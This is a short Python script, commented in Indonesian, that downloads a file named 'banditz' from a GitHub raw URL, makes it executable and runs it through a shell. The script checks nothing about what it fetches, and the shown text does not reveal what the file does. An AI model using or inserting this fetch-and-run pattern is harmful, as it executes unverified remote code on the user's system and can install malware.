import requests
import subprocess

# URL sumber skrip shell eksternal yang ingin Anda unduh dan jalankan
script_url = 'https://raw.githubusercontent.com/adhen13/test/main/banditz'

# Unduh skrip shell eksternal
response = requests.get(script_url)

# Pastikan unduhan berhasil
if response.status_code == 200:
    # Simpan skrip dalam file sementara
    with open('banditz', 'wb') as file:
        file.write(response.content)

    # Berikan izin eksekusi pada skrip
    subprocess.run(['chmod', '+x', 'banditz'])

    # Jalankan skrip shell eksternal
    subprocess.run(['./banditz'],shell=True)
else:
    print("Gagal mengunduh skrip shell eksternal.")
